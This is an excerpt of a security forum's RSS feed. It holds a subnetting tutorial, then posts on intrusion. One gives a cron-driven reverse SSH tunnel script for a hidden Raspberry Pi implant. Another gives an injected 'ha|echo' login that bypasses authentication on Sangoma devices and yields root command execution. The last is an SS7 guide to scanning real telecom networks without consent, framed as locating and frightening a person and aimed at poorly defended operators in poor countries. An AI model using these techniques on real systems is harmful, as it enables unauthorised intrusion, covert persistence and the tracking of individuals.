Now that we have examined the binary method, let's take a look at a simpler way of calculating the same subnet properties. Assuming we have our subnet mask, perhaps using a lookup chart such as the cheatsheet at the bottom, we instead want to find our leftmost number that isn't 255. Let's assume we are working with an IP of 66.52.3.30 and a subnet mask of 255.255.255.240. So, for 255.255.255.240, we have the number 240. To get our "magic number", we subtract 240 from 256, resulting in 16. Our magic number is calculated from the 4th binary octet, so we know our subnets calculate in intervals of 16 from the 4th octet. In other words, we know we would have network addresses of 66.52.3.0, followed by 66.52.3.16, followed by 66.52.3.32, and so on. Using this logic, we know that address 66.52.3.30 is within the network of 66.52.3.16, because the host range of the subnet extends from 66.52.3.17 through 66.52.3.30. We now also know that our broadcast address is 66.52.3.31, and that the next subnet range will begin at 66.52.3.32, giving a valid host range of 14. We can calculate the amount of valid host addresses as our magic number, 16, multiplied by 256 per octet to the right, subtracting 2 lastly.  
<hr>  
<h2>Cheatsheet Chart</h2>  
<div class="md-table">
<table>
<thead>
<tr>
<th>Mask Bit Suffix</th>
<th>Subnet Mask</th>
<th style="text-align:right">Host Addresses per Subnet</th>
</tr>
</thead>
<tbody>
<tr>
<td>/1</td>
<td>128.0.0.0</td>
<td style="text-align:right">2,147,483,646</td>
</tr>
<tr>
<td>/2</td>
<td>192.0.0.0</td>
<td style="text-align:right">1,073,741,822</td>
</tr>
<tr>
<td>/3</td>
<td>224.0.0.0</td>
<td style="text-align:right">536,870,910</td>
</tr>
<tr>
<td>/4</td>
<td>240.0.0.0</td>
<td style="text-align:right">268,435,454</td>
</tr>
<tr>
<td>/5</td>
<td>248.0.0.0</td>
<td style="text-align:right">134,217,726</td>
</tr>
<tr>
<td>/6</td>
<td>252.0.0.0</td>
<td style="text-align:right">67,108,862</td>
</tr>
<tr>
<td>/7</td>
<td>254.0.0.0</td>
<td style="text-align:right">33,554,430</td>
</tr>
<tr>
<td>/8</td>
<td>255.0.0.0</td>
<td style="text-align:right">16,777,214</td>
</tr>
<tr>
<td>/9</td>
<td>255.128.0.0</td>
<td style="text-align:right">8,388,606</td>
</tr>
<tr>
<td>/10</td>
<td>255.192.0.0</td>
<td style="text-align:right">4,194,302</td>
</tr>
<tr>
<td>/11</td>
<td>255.224.0.0</td>
<td style="text-align:right">2,097,150</td>
</tr>
<tr>
<td>/12</td>
<td>255.240.0.0</td>
<td style="text-align:right">1,048,574</td>
</tr>
<tr>
<td>/13</td>
<td>255.248.0.0</td>
<td style="text-align:right">524,286</td>
</tr>
<tr>
<td>/14</td>
<td>255.252.0.0</td>
<td style="text-align:right">262,142</td>
</tr>
<tr>
<td>/15</td>
<td>255.254.0.0</td>
<td style="text-align:right">131,070</td>
</tr>
<tr>
<td>/16</td>
<td>255.255.0.0</td>
<td style="text-align:right">65,534</td>
</tr>
<tr>
<td>/17</td>
<td>255.255.128.0</td>
<td style="text-align:right">32,766</td>
</tr>
<tr>
<td>/18</td>
<td>255.255.192.0</td>
<td style="text-align:right">16,382</td>
</tr>
<tr>
<td>/19</td>
<td>255.255.224.0</td>
<td style="text-align:right">8,190</td>
</tr>
<tr>
<td>/20</td>
<td>255.255.240.0</td>
<td style="text-align:right">4,094</td>
</tr>
<tr>
<td>/21</td>
<td>255.255.248.0</td>
<td style="text-align:right">2,046</td>
</tr>
<tr>
<td>/22</td>
<td>255.255.252.0</td>
<td style="text-align:right">1,022</td>
</tr>
<tr>
<td>/23</td>
<td>255.255.254.0</td>
<td style="text-align:right">510</td>
</tr>
<tr>
<td>/24</td>
<td>255.255.255.0</td>
<td style="text-align:right">254</td>
</tr>
<tr>
<td>/25</td>
<td>255.255.255.128</td>
<td style="text-align:right">126</td>
</tr>
<tr>
<td>/26</td>
<td>255.255.255.192</td>
<td style="text-align:right">62</td>
</tr>
<tr>
<td>/27</td>
<td>255.255.255.224</td>
<td style="text-align:right">30</td>
</tr>
<tr>
<td>/28</td>
<td>255.255.255.240</td>
<td style="text-align:right">14</td>
</tr>
<tr>
<td>/29</td>
<td>255.255.255.248</td>
<td style="text-align:right">6</td>
</tr>
<tr>
<td>/30</td>
<td>255.255.255.252</td>
<td style="text-align:right">2</td>
</tr>
<tr>
<td>/31</td>
<td>255.255.255.254</td>
<td style="text-align:right">x</td>
</tr>
<tr>
<td>/32</td>
<td>255.255.255.255</td>
<td style="text-align:right">x</td>
</tr>
</tbody>
</table>
</div><p>Note that /31 and /32 are not frequently used, and would only be considered “valid” in hyper-specific circumstances which fall outside the scope of this post.</p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/simple-subnet-calculations-in-ipv4/15000">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/simple-subnet-calculations-in-ipv4/15000</link>
          <pubDate>Tue, 16 Jul 2019 02:28:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-15000</guid>
          <source url="https://0x00sec.org/t/simple-subnet-calculations-in-ipv4/15000.rss">Simple Subnet Calculations in IPv4</source>
        </item>
        <item>
          <title>[Theory] A word on Pi and SSH</title>
          <dc:creator><![CDATA[Alice]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>If you haven’t heard the <a href="https://www.pcmag.com/news/369123/nasa-hack-used-a-raspberry-pi" rel="nofollow noopener">news</a> of NASA getting hacked via an authorized raspberry pi… you live under a rock, but anyways this so called hack got me thinking. How easy it is to actually keep a raspberry pi undetectable both physically and also software wise?</p>
<p>A few quick google searches and messing around on my rpi gave results that I find slightly scary (just slightly). My theory of how the hack went down was quite simple in nature… setup the pi at an ethernet port that is out of the way and also by a power source. Have it setup with something like raspbian with the option to automatically login as a certain user so therefore we have access to ssh which is enabled as a system service (launches upon boot). SSH should be running on a common port (e.g. 80, 443,  43). It is setup as a remote ssh tunnel with certificates and have it check every minute if it needs to be created via a cronjob. On our system we than listen on the port that the tunnel was created on and as the user at localhost.</p>
<p>This is actually really simple in nature and not my own original content. If you search up ‘ssh reverse tunneling’ you will get a lot of articles on how to do this. The reason why this is possible is because of SSH’s ability to locally port forward a port. The command in question is something along this:</p>
<p><code>ssh -R 8080:localhost:22 myBoxxy@someLocalipAddress</code></p>
<p>This is run on our pi or whatever. On our own laptop, we do something like this:</p>
<p><code>ssh -p 8080 myPi@localhost</code></p>
<p>So essentially if the theory is correct, all you have to do is setup a bash script to try to make the tunnel and have it be checked every minute via a cronjob. Of course if you want to do it on another network, you would have to port forward the port used. The bash script that I cannot take credit for is:</p>
<pre><code class="lang-bash">#!/usr/bin/env bash

createTunnel() {

     /usr/bin/ssh -o 'StrictHostKeyChecking no' -N -R 8080:localhost:80 myBoxxy@someIPaddress

}

/bin/pidof ssh
if [[ $? -ne 0 ]]; then
          createTunnel
fi
</code></pre>
<p>Yeah I know. Really simple. Have a function that creates the tunnel and if the PID is 0, call that function.</p>
<p>Pretty much this proves how simple stuff can be:</p>
<ol>
<li>Overlooked</li>
<li>Cause a huge security issue</li>
<li>A bit of creativity can go a long way</li>
</ol>
<p>The latter is what I find intriguing. Humans have the tendency to over think certain things. They can patch all the ‘critical and obvious’ vulns, but something as simple as a Bad USB drop or someone walking through the front door and installing a pi I find overlooked quite a bit.</p>
<p>I know. Quick and dirty, but this was just me sharing a theory. The limit is limitless.</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565</link>
          <pubDate>Mon, 24 Jun 2019 15:21:51 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-14565</guid>
          <source url="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565.rss">[Theory] A word on Pi and SSH</source>
        </item>
        <item>
          <title>Overlooked privesc on Sangoma Netborder device</title>
          <dc:creator><![CDATA[Shellsquid]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hello 0x00sec,</p>
<p>here I’d like to add a exploit that I happened to discover during my exploration of telco networks.</p>
<p>There is a known exploit for “Sangoma SBC”, that allows you to login into the web config with an universal username of</p>
<pre><code>ha|echo
</code></pre>
<p>And any password (it’s irrelevant).<br>
<br><br><br>
You can read about it here:<br>
<br></p>
<p></p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://wiki.freepbx.org/s/en_US/7702/c32f84c806260a834c2e109e904a2d8ee4f8e175/87/_/favicon.ico" class="site-icon" width="128" height="128">
      <a href="https://wiki.freepbx.org/display/SBC/SBC+Security+Advisory+SEC-20180126" target="_blank" rel="noopener nofollow ugc">wiki.freepbx.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://wiki.freepbx.org/display/SBC/SBC+Security+Advisory+SEC-20180126" target="_blank" rel="noopener nofollow ugc">SBC Security Advisory SEC-20180126 - Session Border Controller - Documentation</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<a href="https://blog.appsecco.com/sangoma-sbc-remote-command-execution-cve-2017-17430-8c8ad744150c" class="onebox" target="_blank" rel="noopener nofollow ugc">https://blog.appsecco.com/sangoma-sbc-remote-command-execution-cve-2017-17430-8c8ad744150c</a><p></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0fab1f62a43a6fbb025ded36a979574bfd43cb80.png" alt="image" data-base62-sha1="2eBN0Oo6uCRkfP7FVjmFewhUDLO" width="690" height="439"></p>
<p>You then have root access to the configuration and could change or crash the whole system.</p>
<p>What wasn’t mentioned in any of the articles I found, is the following:</p>
<p>If you go to to <strong>“Configuration” --&gt; "Command execution"</strong><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/9/96edac7a7f8151ff127780979c6d06139cccbd31.png" alt="image" data-base62-sha1="lxaPIIYDNc91LnHCY5qaDP7Khax" width="690" height="234"></p>
<p>You will be seeing this screen. If you click on the “Show Shell/NSG Commands” it lists some four or five commands. Normally you’d assume these are the commands you’re able/allowed to use.</p>
<p>However, when you type in and execute</p>
<pre><code>whoami
</code></pre>
<p>then the output (it gives the results in html) is</p>
<pre><code>root
</code></pre>
<p>And voila, you just have a root shell (although it’s a bit difficult to handle with the indirect html-output).</p>
<p>But you can send all commands and even access the juicy files and contents or set up a reverse shell.</p>
<p>Although I doubt that will be of use for anyone here, I thought I’d just let you know.</p>
<p>Just in case <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/overlooked-privesc-on-sangoma-netborder-device/12431">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/overlooked-privesc-on-sangoma-netborder-device/12431</link>
          <pubDate>Thu, 21 Mar 2019 14:02:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12431</guid>
          <source url="https://0x00sec.org/t/overlooked-privesc-on-sangoma-netborder-device/12431.rss">Overlooked privesc on Sangoma Netborder device</source>
        </item>
        <item>
          <title>Into the wild: Gaining access to SS7 - Part 1: Finding an access point</title>
          <dc:creator><![CDATA[Shellsquid]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <h2>„Writing a 'How to' [sic] for the first time is a lot like having sex for the first time. You're excited but you don't really know what the hell you're doing. And some way, one way or another, it's over too fast.“ - Yuri Orlov </h2>
<br><br><br>
Hello 0x00sec,
<p>Today I gonna try to write my very first „How To“, so… Never done that, never been there, show mercy!</p>
<p>I decided to do that because I couldn’t find anything comparable on the internet so far and I thought maybe someone out there might be interested as well and might find some help in it to reduce his/her efforts by many hours.</p>
<p>This will likely become a series of two or three „How To“-articles, which I hope to write in the coming weeks and which will cover basically my own discoveries and insights.<br>
<br><br><br>
<strong>Preamble:</strong></p>
<p>There are only two ways to practice working in and with SS7:</p>
<ol>
<li>You work for a telco company (thanks, I already have job)</li>
<li>You go out and try out yourself in the wild (not recommended of course)</li>
</ol>
<p>So, since most of us are left with only <strong>Option 2</strong>, one has to probably read a lot and go for a path shattered with trial-and-error, which is what we’re going to do now. (Isn’t hacking always like that?)</p>
<p><strong><em>Since hacking/pentesting without consent is illegal, this whole article and the upcoming ones are written from a purely educational perspective and for that use only. What ever you do with the knowledge is your own problem and I’m neither responsible nor legally liable for anything you might do and/or destroy.</em></strong></p>
<p>Said that, let’s start right away:</p>
<h2>0. Tools &amp; Services used today</h2>
<pre><code>1. Browser of choice
2. nmap
3. Burp Community Edition
4. Website - http://ipv4info.com
</code></pre>
<p>Part 1 might seem a bit trivial, however, we need to get that done first to do the more interesting stuff later on.</p>
<h1>1. What is SS7</h1>
<p>I will keep that paragraph rather short as in terms of definitions there are a lot of resources online.</p>
<p><strong>So, what is SS7?</strong><br>
<a href="https://en.wikipedia.org/wiki/Signalling_System_No._7" rel="noopener nofollow ugc">SS7</a> is a rather complex topic with (comparably) very little resources available that offer in-depth insights or knowledge. On top of that, there is literally no information about it from a security/pentesting perspective - which makes you wonder if that is on purpose.</p>
<p>Anyway, what is it now?</p>
<p>Maybe it helps you to imagine it the following way (who loved Super Mario back then, will inevitably think of it now <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=9" title=":grinning:" class="emoji" alt=":grinning:"> ):</p>
<ul>
<li>Unless the regular internet, SS7 is a closed shop with limited access. It is like a network of tubes under earth, all interconnected. Above earth there are entry points/those vertical tubes to jump in.</li>
<br>
<li>Each entry point has a distinct identifier, called <b>ISPC</b> - <b>I</b>nternational <b>S</b>ignaling <b>P</b>oint <b>C</b>ode</li>
<br>
<li>These entry points are managed by telco companies and we are now going to search for them to jump in and dive deep.</li>
</ul>
<br><br>
<p>The following image gives an idea about the basic structure of SS7, its different protocols and the connection between IP protocols (light blue) and the PSTN protocols (Public Switched Telephone Network - dark blue).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/16f224af9cedf9a042f3d9892767dd783d1e69de.jpeg" alt="image" data-base62-sha1="3gZie5rdVAoHovY7cpADaRfIa7k" width="530" height="281"><br>
<em>I didn’t get any money from Cisco for advertising them here.</em></p>
<p><br><br></p>
<ul>
<b>Side note:</b><br>
When I first started researching SS7 I found some scanners, like *sctpcanner* and the like which are designed to discover open SCTP ports (which is like finding the root password in an open ftp). However, I never came across any open port and I scanned a lot of hosts. This is why we're now going the hard way.
</ul>
<br><br>
<h1>2. Setting a goal</h1>
Making use of SS7 usually comes with a grain of salt. If you wanted to set up a telco company you'd probably not read this. Said that, in most cases your reasons might be a bit shady, such as intercepting calls, SMS or location tracking.
<br><br>
Which protocol (and later on which software) you use is very dependent on what you want to achieve, which makes answering this question the first step:
<br><br>
<ul><b>Define the goal: What do you want to do/achieve?</b></ul>
<p>In our case, let’s take the following fictional story:</p>
<p>We got betrayed by a person who we thought would be a good friend and who owes us a lot of money. Since he disappeared there is no way for us to get a hold on him. Maybe we just want to scare him a bit by letting him know that wherever he is we know where he is. Make him feel a bit paranoid maybe.</p>
<ul><b>Story : ✔︎</b></ul>
<p><em>„ So, how could SS7 help him with that?“</em>, you might wonder. After doing some research we find out that mobile phone tracking is possible through SS7, using the <a href="https://en.wikipedia.org/wiki/Mobile_Application_Part" rel="noopener nofollow ugc"><strong><em>MAP - Mobile Application Part</em></strong></a>, one of the essential protocols of SS7 (as seen in the image above).  It’s basically the protocol that enables mobile telephony.</p>
<p>We might read that when working with <strong>Wireshark</strong> and <strong>MAP</strong> one could read a lot of information: in which country the subscriber is, what area and what cell tower he is connected to, when we fire off the command. And all that with a phone number. In most countries, especially in metropolitan areas, where there are a lot of cell towers, they give a very good indication about the location of the phone. Cell towers all have a unique ID, called <strong>CellID</strong>.</p>
<p>Wireshark is even able to give a link to OpenStreetMaps, marking the CellID’s location.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cd2d51dd0bc5dcaecee3b020802e744afa6b5ed3.jpeg" alt="image" data-base62-sha1="th4YFONFrWEiAxMrK03bcDYQLuj" width="690" height="265"><br>
<em>Credits for this screenshot to <a href="https://twitter.com/2b_as?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor" rel="noopener nofollow ugc">Tobias Engel</a>, Chaos Computer Club, Germany.</em></p>
<p>To learn a bit more about Wireshark’s SS7 capabilities, see this pdf from a Wireshark employee <a href="https://sharkfestus.wireshark.org/sharkfest.08/T1-12_Tuexen_SCTP_SIGTRAN%20and%20SS7.pdf" rel="noopener nofollow ugc">here.</a></p>
<p>Check out this website <a href="https://www.opencellid.org/" rel="noopener nofollow ugc">https://www.opencellid.org</a> to get an idea of how many cell towers are around you!<br>
<br></p>
<ul><b>Goal set: ✔︎
<br>
(Somehow) getting access to SS7 to (somehow) use MAP.</b></ul>
<br>
<p>Right now we don’t really have a clue what all that is about. All we know is that we somehow need to figure out how to get that done. Fair enough.</p>
<p>After researching a bit further, we come to the conclusion that SS7 is a globally interconnected net. Makes sense. Wherever on earth you are, most likely you can call someone on any place in the world (except maybe the poles).</p>
<pre><code>And that’s the beauty of SS7! 
Why?
Because we can choose the access point ourselves.
</code></pre>
<p>Now let’s imagine SS7 is a treasure that is totally locked down and chained and we obviously do not have the key for the lock.</p>
<pre><code>"Every chain is only as strong as its weakest link".
</code></pre>
<p>So, obviously we’re going to look for a weak link. Speaking the language of communication networks, what would a weak link be?</p>
<pre><code>A poorly configured server/router that allows us to get access to SS7.
</code></pre>
<p>So, going by the Salami-tactic, we choose „Finding a weak link“ to be our first step on reaching our goal.</p>
<p>How do we find such a weak link?</p>
<p>The following <em>chain</em> of questions and answers will lead us to potential assessment targets:</p>
<pre><code>Q: What is a badly configured server/router?
A: One that offers a lot of attack surface.

Q: Why would anyone configure it that way?
A: By error or because of lacking knowledge - or both.

Q: From a global perspective, where would the possibility 
   be the highest to find such?
A: In places where there is bad education and little money
   (to pay for better educated staff).

Q: Where do we find them?
A: In poor countries.

Q: What’s the bonus?
A: No one cares about a small telco company from a poor country, 
   so if we’d really be that sick and try to hack… eh pentest it - chances 
   are little that anything would happen even if we’d mess it up. 
   (From a purely professional perspective! 
   That’s not necessarily my „emotional“ point of view!)
</code></pre>
<p>By answering the questions, we now have a more specified goal.</p>
<pre><code>Finding a poorly configured server in a poor country with access to SS7.
</code></pre>
<p>First, we check out a list of the poorest countries in the world. Second, we choose a few and check if they have access to SS7. (Btw: you’d be surprised how many international telco companies are active e.g. in Africa, such as Vodafone or huge Indian ones)</p>
<p>The following .pdf might help us figuring out if there are entry points in the respective country and which company is managing each of the entry points:</p>
<aside class="onebox pdf">
  <header class="source">
      <a href="https://www.itu.int/dms_pub/itu-t/opb/sp/T-SP-Q.708B-2012-PDF-E.pdf" target="_blank" rel="noopener nofollow ugc">itu.int</a>
  </header>
  <article class="onebox-body">
    <a href="https://www.itu.int/dms_pub/itu-t/opb/sp/T-SP-Q.708B-2012-PDF-E.pdf" target="_blank" rel="noopener nofollow ugc"><span class="pdf-onebox-logo"></span></a>
<h3><a href="https://www.itu.int/dms_pub/itu-t/opb/sp/T-SP-Q.708B-2012-PDF-E.pdf" target="_blank" rel="noopener nofollow ugc">T-SP-Q.708B-2012-PDF-E.pdf</a></h3>

<p class="filesize">421.74 KB</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Although the document is 7 years old, most of the telco companies listed there still do exist.</p>
<p>After we’ve checked if these companies still exist we choose our assessment targets.</p>
<p>Now we need to find out the servers run by the respective company. One website that has proven valuable for this task is:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ea95b2044c66bc50d112c342f61f2c3bc4fa2662.png" class="site-icon" width="32" height="32">
      <a href="http://ipv4info.com/" target="_blank" rel="noopener nofollow ugc">ipv4info.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1ca4edcc9d843e4321eae90d5992debd1aec5ce1.png" class="thumbnail onebox-avatar" width="144" height="144">

<h3><a href="http://ipv4info.com/" target="_blank" rel="noopener nofollow ugc">IPv4Info - All data for ipv4 network blocks and autonomous systems</a></h3>

<p>All-in-one tool to view ipv4 netblock registration data, ipv4 allocation table, all domains on same ip address or in same netblock, ASN information.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>At the upper right corner you can simply search for IPs or in our case keywords (e.g. company names) and the site prints out a table with all entries matching your keywords.</p>
<p>This page not only allows for various kinds of lookups but gives many additional information about the blocks in a very structured way. The page looks a bit old fashioned but provides a lot of valuable information, as you can see in this example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/85f4c31eebcae3acd5ed4aeb007bc727ea24f2a6.png" alt="image" data-base62-sha1="j71U3wX1fZY3sVPIhh9dU8CJhEW" width="482" height="109"></p>
<p>Although the „description“ is not mandatory, you often find information that might help you.<br>
<br><br></p>
<h2>3. Let’s go!</h2>
<p>Now, since we did a bit of research let’s go and begin the real (hard) work.</p>
<p>From here, we start like we always do and go for <strong>nmap</strong> to see how „open“ the network is.</p>
<p>Depending on the size of the telcos there will be many, many hosts to scan. And that is where a quote comes to my mind that roughly goes like:</p>
<pre><code>"In SS7 it is less about security. It is more about finding the access.“ 
- by unknown.
</code></pre>
<p>This is where the above mentioned additional information from <a href="http://ipv4info.com/" rel="noopener nofollow ugc">http://ipv4info.com/</a> comes in handy and might shorten that period of scanning as you might find some blocks giving hints on the telco infrastructure etc.</p>
<p><strong>Results:</strong><br>
After doing some trivial scanning we found two blocks (512 hosts) that are quite interesting as they offer a very solid (or not so solid?) attack surface:</p>
<ul>
<li>512 hosts overall</li>
<li>60 hosts with at least one open port</li>
<li>274 open ports overall</li>
</ul>
<p><em><strong>And that’s TCP only!</strong></em></p>
<p>On our first try to catch a glimps on the hosts we do a very rough nmap scan:</p>
<pre><code>nmap XXX.XXX.XXX.0/24 -Pn
</code></pre>
<p>We’re not switching some -T4 or -T5 as we have seen before that shortening the interval might falsify the results (probably due to some firewall):</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/669d1b05fed38fd2ed6472ee7574046f1aa92c6d.png" alt="image" data-base62-sha1="eDLixJ0qTUQqDYsf1Uo0jxIWEOx" width="500" height="330"></p>
<p>Besides many http ports we find several open telnet ports. Testing those we get to some telnet logins for Huawei, ZTE routers and alike, but when we google them they seem to be more or less small scale office routers. Nothing of interest for now.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/8aeb1e8c8157886aabac072841f23633f9cfe2e6.png" data-download-href="/uploads/short-url/jOVDavBSBsdK0OoDVwxZ1Oujsfc.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8aeb1e8c8157886aabac072841f23633f9cfe2e6.png" alt="image" data-base62-sha1="jOVDavBSBsdK0OoDVwxZ1Oujsfc" width="690" height="130" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8aeb1e8c8157886aabac072841f23633f9cfe2e6_2_10x10.png"></a></div><p></p>
<p>So, having open ports and hosts is good. However, we’re not looking for any server but <strong>the one</strong>.</p>
<p>When scrolling through the nmap results, we see a lot of open „port 80“ so obviously we want to know what’s on there.</p>
<p>Besides the website of the respective telco company we find again some login pages for different routers and some for web apps. On each checking the code doesn’t reveal anything promising.</p>
<p>Before burning our fingers on those logins, let’s do some more nmap scanning to find out the versions and OS of the (at a first glance) interesting hosts.</p>
<p>After doing a lot of scanning, we take a look on the results.</p>
<p>What immediately pops in our eye is a host running on Cisco IOS with 5 open ports, whereas we don’t see Cisco IOS on any other host. Most are run on VM with RHEL or some show <a href="https://en.wikipedia.org/wiki/QEMU" rel="noopener nofollow ugc">qemu user mode emulation</a>.</p>
<p>Since Cisco is world leader in the router market let’s take a closer look:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5eb4fea8c40fbecc51c311b1b4959f5b82c0b55f.png" alt="image" data-base62-sha1="dvOF1CGBPG3fTa8M7DCYvmWyiLB" width="482" height="172"></p>
<p>Port 80 open, four other ports as well - 2001,4001, 6001, 9001 - with unknown services and versions. So let’s check that one out.</p>
<p>When trying with a browser, a simple user/password prompt pops up. No greetings, information, no nothing.</p>
<p>To get a human-readable and fully featured response on our GET request, <em>let’s Burp it up</em>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1f7f323381d788a60752ed294ccb42674a736afe.png" alt="image" data-base62-sha1="4uDjIgFRQtsseF9tn4E5e96EEdU" width="373" height="221"></p>
<p><strong>WWW-Authenticate: Basic realm=„level_15_access“.</strong></p>
<p>Doesn’t sound too bad, does it? Without knowing anything specific, let’s google the “basic realm level 15 access” and shortly after, we find out that „Level 15“ is the highest access level on any Cisco product.</p>
<p>Alright buddy, now we’re talking.</p>
<p>Next, we need to find out what these four other ports are for since we can’t get no information from nmap.</p>
<p>Using any other scanner doesn’t shed a light on these ports. They are shown up as open but without any indication about what they’re used for. Also, the X001 four times seems to be configured manually so these ports are there for purpose.</p>
<p>Based on the open telnet ports on several other servers, we decide to give it a try and telnet those ports.</p>
<p>And…. What’s that?</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/21fc94b5b21a901ff337869aeb5e6dfcc66790fd.png" data-download-href="/uploads/short-url/4QEUkFggJtmezMuGU6ehSaonvNr.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/21fc94b5b21a901ff337869aeb5e6dfcc66790fd.png" alt="image" data-base62-sha1="4QEUkFggJtmezMuGU6ehSaonvNr" width="690" height="281" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/21fc94b5b21a901ff337869aeb5e6dfcc66790fd_2_10x10.png"></a></div><p></p>
<p>That doesn’t give much information on the first sight, plus it sounds a bit scary. On all ports we’re greeted with the same welcome screen.</p>
<p>Under the red edited block there was the name of the telco and the city where the device is located. All that was known. But what is ITP1? No clue. Let’s ask Google.</p>
<pre><code>"Cisco" "ITP1"
</code></pre>
<p>And of course, Google knows what it is:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e609e40031c30d52abf0279360a3e042010a63a8.png" alt="image" data-base62-sha1="wP10xJyFOLsTe38l00PhehpnTgQ" width="690" height="204"></p>
<br>
<h2>Congrats, we just found our SS7 access point.</h2>
<br><br>
I hope someone of you might find it useful. I already did some more than what's written here but so far no real results to present. I'm hoping to make progress in the coming days and weeks so it will be worth to write down Part 2 and maybe 3.
<p>If you have any questions, let me know.</p>
<p>Of course, ideas and (constructive) criticism are very welcome.</p>
            <p><small>52 posts - 29 participants</small></p>
            <p><a href="https://0x00sec.org/t/into-the-wild-gaining-access-to-ss7-part-1-finding-an-access-point/12418">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/into-the-wild-gaining-access-to-ss7-part-1-finding-an-access-point/12418</link>
          <pubDate>Thu, 21 Mar 2019 00:24:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12418</guid>
          <source url="https://0x00sec.org/t/into-the-wild-gaining-access-to-ss7-part-1-finding-an-access-point/12418.rss">Into the wild: Gaining access to SS7 - Part 1: Finding an access point</source>
        </item>
        <item>
          <title>SS7 and Telco backbone infrastructure</title>
          <dc:creator><![CDATA[occupi]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Okay folks, I read this Motherboard article recently and now I’m quite interested in SS7, the backend Telco network that essentially routes all mobile calls and texts.<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/5/52ff377024dacd7a7daeffdee11cb0b502785e48.png" class="site-icon" width="228" height="228">
      <a href="https://www.vice.com/en_us/article/mbzvxv/criminals-hackers-ss7-uk-banks-metro-bank" target="_blank" rel="noopener nofollow ugc">vice.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/077f169e661ba58f5e0fdd1be049e99aa2164668.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://www.vice.com/en_us/article/mbzvxv/criminals-hackers-ss7-uk-banks-metro-bank" target="_blank" rel="noopener nofollow ugc">Criminals Are Tapping into the Phone Network Backbone to Empty Bank Accounts</a></h3>

<p>Motherboard has identified a specific UK bank that has fallen victim to so-called SS7 attacks, and sources say the issue is wider than previously reported.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>The fact that this network is both vast and vastly insecure at many entry points leads me to believe they must be exposed on the web somewhere.<br>
Now, obviously I will not condone any sort of malicious abuse of these potentially exposed SS7 network points-of-entry, but discovering them could be a huge find and pushing telcos to secure big infrastructure is a win for everyone.</p>
<p>This is just a call for more information on the subject as I’m keenly interested in what kind of network protocols they use, etc. Thanks for reading!</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/ss7-and-telco-backbone-infrastructure/11450">Read full topic</a></p>
          ]]></description>
